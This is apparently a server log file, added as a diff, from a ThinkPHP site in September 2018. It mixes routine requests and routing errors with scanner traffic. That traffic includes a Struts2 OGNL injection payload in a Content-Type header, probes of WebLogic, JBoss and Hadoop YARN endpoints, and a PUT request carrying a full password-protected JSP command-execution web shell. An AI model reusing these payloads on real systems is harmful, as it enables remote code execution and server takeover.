@@ -1,0 +1,1413 @@
+---------------------------------------------------------------
+[ 2018-09-18T03:29:02+08:00 ] 172.17.0.24 139.199.158.66 GET /otsmobile/app/mgs/mgw.htm?operationType=com.cars.otsmobile.queryLeftTicket&requestData=%5B%7B%22train_date%22%3A%2220180925%22%2C%22purpose_codes%22%3A%2200%22%2C%22from_station%22%3A%22SZH%22%2C%22to_station%22%3A%22CSQ%22%2C%22station_train_code%22%3A%22%22%2C%22start_time_begin%22%3A%220000%22%2C%22start_time_end%22%3A%222400%22%2C%22train_headers%22%3A%22QB%23%22%2C%22train_flag%22%3A%22%22%2C%22seat_type%22%3A%22%22%2C%22seatBack_Type%22%3A%22%22%2C%22ticket_num%22%3A%22%22%2C%22dfpStr%22%3A%22%22%2C%22baseDTO%22%3A%7B%22check_code%22%3A%224bb68eaedbf274948567e81ef6719815%22%2C%22device_no%22%3A%22ace75679625ddaf4d6da4853d0549c82%22%2C%22mobile_no%22%3A%22%22%2C%22os_type%22%3A%22a%22%2C%22time_str%22%3A%2220180918032901%22%2C%22user_name%22%3A%22%22%2C%22version_no%22%3A%224.0.0.07121250%22%7D%7D%5D&ts=1537212541934&sign=
+[ info ] mobile.12306.cn/otsmobile/app/mgs/mgw.htm?operationType=com.cars.otsmobile.queryLeftTicket&requestData=%5B%7B%22train_date%22%3A%2220180925%22%2C%22purpose_codes%22%3A%2200%22%2C%22from_station%22%3A%22SZH%22%2C%22to_station%22%3A%22CSQ%22%2C%22station_train_code%22%3A%22%22%2C%22start_time_begin%22%3A%220000%22%2C%22start_time_end%22%3A%222400%22%2C%22train_headers%22%3A%22QB%23%22%2C%22train_flag%22%3A%22%22%2C%22seat_type%22%3A%22%22%2C%22seatBack_Type%22%3A%22%22%2C%22ticket_num%22%3A%22%22%2C%22dfpStr%22%3A%22%22%2C%22baseDTO%22%3A%7B%22check_code%22%3A%224bb68eaedbf274948567e81ef6719815%22%2C%22device_no%22%3A%22ace75679625ddaf4d6da4853d0549c82%22%2C%22mobile_no%22%3A%22%22%2C%22os_type%22%3A%22a%22%2C%22time_str%22%3A%2220180918032901%22%2C%22user_name%22%3A%22%22%2C%22version_no%22%3A%224.0.0.07121250%22%7D%7D%5D&ts=1537212541934&sign= [运行时间：0.014542s][吞吐率：68.77req/s] [内存消耗：1,648.23kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'otsmobile',
+    1 => 'app',
+    2 => 'mgs',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'workspaceid' => 'product',
+  'trackerid' => '',
+  'signtype' => '0',
+  'platform' => 'ANDROID',
+  'did' => 'ace75679625ddaf4d6da4853d0549c82',
+  'appid' => '9101430221728',
+  'user-agent' => 'Go-http-client/1.1',
+  'host' => 'mobile.12306.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'operationType' => 'com.cars.otsmobile.queryLeftTicket',
+  'requestData' => '[{"train_date":"20180925","purpose_codes":"00","from_station":"SZH","to_station":"CSQ","station_train_code":"","start_time_begin":"0000","start_time_end":"2400","train_headers":"QB#","train_flag":"","seat_type":"","seatBack_Type":"","ticket_num":"","dfpStr":"","baseDTO":{"check_code":"4bb68eaedbf274948567e81ef6719815","device_no":"ace75679625ddaf4d6da4853d0549c82","mobile_no":"","os_type":"a","time_str":"20180918032901","user_name":"","version_no":"4.0.0.07121250"}}]',
+  'ts' => '1537212541934',
+  'sign' => '',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T03:29:02+08:00 ] 172.17.0.24 139.199.158.66 GET /otsmobile/app/mgs/mgw.htm?operationType=com.cars.otsmobile.queryLeftTicket&requestData=%5B%7B%22train_date%22%3A%2220180925%22%2C%22purpose_codes%22%3A%2200%22%2C%22from_station%22%3A%22SZH%22%2C%22to_station%22%3A%22CSQ%22%2C%22station_train_code%22%3A%22%22%2C%22start_time_begin%22%3A%220000%22%2C%22start_time_end%22%3A%222400%22%2C%22train_headers%22%3A%22QB%23%22%2C%22train_flag%22%3A%22%22%2C%22seat_type%22%3A%22%22%2C%22seatBack_Type%22%3A%22%22%2C%22ticket_num%22%3A%22%22%2C%22dfpStr%22%3A%22%22%2C%22baseDTO%22%3A%7B%22check_code%22%3A%224bb68eaedbf274948567e81ef6719815%22%2C%22device_no%22%3A%22ace75679625ddaf4d6da4853d0549c82%22%2C%22mobile_no%22%3A%22%22%2C%22os_type%22%3A%22a%22%2C%22time_str%22%3A%2220180918032901%22%2C%22user_name%22%3A%22%22%2C%22version_no%22%3A%224.0.0.07121250%22%7D%7D%5D&ts=1537212541934&sign=
+[ info ] mobile.12306.cn/otsmobile/app/mgs/mgw.htm?operationType=com.cars.otsmobile.queryLeftTicket&requestData=%5B%7B%22train_date%22%3A%2220180925%22%2C%22purpose_codes%22%3A%2200%22%2C%22from_station%22%3A%22SZH%22%2C%22to_station%22%3A%22CSQ%22%2C%22station_train_code%22%3A%22%22%2C%22start_time_begin%22%3A%220000%22%2C%22start_time_end%22%3A%222400%22%2C%22train_headers%22%3A%22QB%23%22%2C%22train_flag%22%3A%22%22%2C%22seat_type%22%3A%22%22%2C%22seatBack_Type%22%3A%22%22%2C%22ticket_num%22%3A%22%22%2C%22dfpStr%22%3A%22%22%2C%22baseDTO%22%3A%7B%22check_code%22%3A%224bb68eaedbf274948567e81ef6719815%22%2C%22device_no%22%3A%22ace75679625ddaf4d6da4853d0549c82%22%2C%22mobile_no%22%3A%22%22%2C%22os_type%22%3A%22a%22%2C%22time_str%22%3A%2220180918032901%22%2C%22user_name%22%3A%22%22%2C%22version_no%22%3A%224.0.0.07121250%22%7D%7D%5D&ts=1537212541934&sign= [运行时间：0.014438s][吞吐率：69.26req/s] [内存消耗：1,645.76kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'workspaceid' => 'product',
+  'trackerid' => '',
+  'signtype' => '0',
+  'platform' => 'ANDROID',
+  'did' => 'ace75679625ddaf4d6da4853d0549c82',
+  'appid' => '9101430221728',
+  'user-agent' => 'Go-http-client/1.1',
+  'host' => 'mobile.12306.cn',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 GET /verifylogin.do
+[ info ] 39.107.111.90/verifylogin.do [运行时间：0.014610s][吞吐率：68.45req/s] [内存消耗：1,646.02kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'verifylogin.do',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'https://39.107.111.90:443/verifylogin.do',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => '%{(#test=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(55*55+1)).(#ros.flush())}',
+  'connection' => 'Keep-Alive',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 GET /verifylogin.do
+[ info ] 39.107.111.90/verifylogin.do [运行时间：0.014084s][吞吐率：71.00req/s] [内存消耗：1,646.05kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'https://39.107.111.90:443/verifylogin.do',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => '%{(#test=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(55*55+1)).(#ros.flush())}',
+  'connection' => 'Keep-Alive',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 GET /invoker/readonly
+[ info ] 39.107.111.90/invoker/readonly [运行时间：0.014414s][吞吐率：69.38req/s] [内存消耗：1,643.30kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'invoker',
+    1 => 'readonly',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'https://39.107.111.90:443/invoker/readonly',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 GET /invoker/readonly
+[ info ] 39.107.111.90/invoker/readonly [运行时间：0.014354s][吞吐率：69.67req/s] [内存消耗：1,643.26kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'https://39.107.111.90:443/invoker/readonly',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 GET /wls-wsat/CoordinatorPortType
+[ info ] 39.107.111.90/wls-wsat/CoordinatorPortType [运行时间：0.014430s][吞吐率：69.30req/s] [内存消耗：1,645.41kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'wls-wsat',
+    1 => 'CoordinatorPortType',
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0',
+  'referer' => 'https://39.107.111.90/wls-wsat/CoordinatorPortType',
+  'accept-language' => 'zh-cn',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'content-type' => 'text/xml',
+  'connection' => 'close',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 GET /wls-wsat/CoordinatorPortType
+[ info ] 39.107.111.90/wls-wsat/CoordinatorPortType [运行时间：0.014178s][吞吐率：70.53req/s] [内存消耗：1,645.31kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0',
+  'referer' => 'https://39.107.111.90/wls-wsat/CoordinatorPortType',
+  'accept-language' => 'zh-cn',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'content-type' => 'text/xml',
+  'connection' => 'close',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 PUT /indexweb4.jsp/
+[ info ] 39.107.111.90/indexweb4.jsp/ [运行时间：0.014661s][吞吐率：68.21req/s] [内存消耗：1,649.59kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'indexweb4.jsp',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'content-length' => '776',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'https://39.107.111.90:443/indexweb4.jsp/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'text/plain; Charset=UTF-8',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  '<%@_page_language' => '"java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%>
+<%!public static String excuteCmd(String c) 
+{
+    StringBuilder line = new StringBuilder();
+try 
+{
+    Process pro = Runtime.getRuntime().exec(c);
+    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));
+    String temp = null;
+    while ((temp = buf.readLine()) != null) 
+    {
+        line.append(temp "\\\\n");
+    }
+    buf.close();
+} 
+catch (Exception e) 
+{
+    line.append(e.getMessage());
+}
+return line.toString();
+}
+%>
+<%
+if("bala123".equals(request.getParameter("pwd"))',
+  '!""_equals(request_getParameter("cmd")))
+{
+____out_println("<pre>"_excuteCmd(request_getParameter("cmd"))_"</pre>");
+}
+else
+{
+____out_println(":-)");
+}
+%>' => '',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 GET /indexweb4.jsp/
+[ info ] 39.107.111.90/indexweb4.jsp/ [运行时间：0.014105s][吞吐率：70.90req/s] [内存消耗：1,646.34kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'content-length' => '776',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'https://39.107.111.90:443/indexweb4.jsp/',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'text/plain; Charset=UTF-8',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 POST /ws/v1/cluster/apps/new-application
+[ info ] 39.107.111.90/ws/v1/cluster/apps/new-application [运行时间：0.014300s][吞吐率：69.93req/s] [内存消耗：1,645.79kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'ws',
+    1 => 'v1',
+    2 => 'cluster',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'https://39.107.111.90:443/ws/v1/cluster/apps/new-application',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+  'apps' => 'new-application',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T08:49:03+08:00 ] 172.17.0.24 123.234.210.248 GET /ws/v1/cluster/apps/new-application
+[ info ] 39.107.111.90/ws/v1/cluster/apps/new-application [运行时间：0.013948s][吞吐率：71.70req/s] [内存消耗：1,644.67kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '39.107.111.90',
+  'content-length' => '0',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'https://39.107.111.90:443/ws/v1/cluster/apps/new-application',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'connection' => 'Keep-Alive',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T15:55:05+08:00 ] 172.17.0.24 123.139.18.13 GET /favicon.ico
+[ info ] mp.zihai029.com/favicon.ico [运行时间：0.015430s][吞吐率：64.81req/s] [内存消耗：1,645.20kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'favicon.ico',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'referer' => 'https://mp.zihai029.com/api/v1/banner',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T15:55:05+08:00 ] 172.17.0.24 123.139.18.13 GET /favicon.ico
+[ info ] mp.zihai029.com/favicon.ico [运行时间：0.014604s][吞吐率：68.48req/s] [内存消耗：1,645.23kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'referer' => 'https://mp.zihai029.com/api/v1/banner',
+  'accept' => 'image/webp,image/apng,image/*,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T15:55:56+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.017706s][吞吐率：56.48req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T15:57:24+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.015123s][吞吐率：66.12req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'GET',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:01:17+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014468s][吞吐率：69.12req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'POST',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:07:12+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014332s][吞吐率：69.77req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'POST',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:07:16+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014463s][吞吐率：69.14req/s] [内存消耗：1,645.47kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate, br',
+  'accept' => '*/*',
+  'access-control-request-headers' => 'test',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
+  'origin' => 'null',
+  'access-control-request-method' => 'POST',
+  'connection' => 'keep-alive',
+  'host' => 'mp.zihai029.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-09-18T16:08:10+08:00 ] 172.17.0.24 123.139.18.13 OPTIONS /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014809s][吞吐率：67.53req/s] [内存消耗：1,606.44kb] [文件加载：44]
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/thinkphp/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/mp.zihai029.com/application/lang/zh-cn.php
+[ info ] [ LOG ] INIT File
+[ error ] [0]致命错误: Call to undefined method think\Route::options()[/www/wwwroot/mp.zihai029.com/application/route.php:18]
+---------------------------------------------------------------
+[ 2018-09-18T16:10:17+08:00 ] 172.17.0.24 123.139.18.13 GET /api/v1/banner
+[ info ] mp.zihai029.com/api/v1/banner [运行时间：0.014362s][吞吐率：69.63req/s] [内存消耗：1,645.47kb] [文件加载：44]
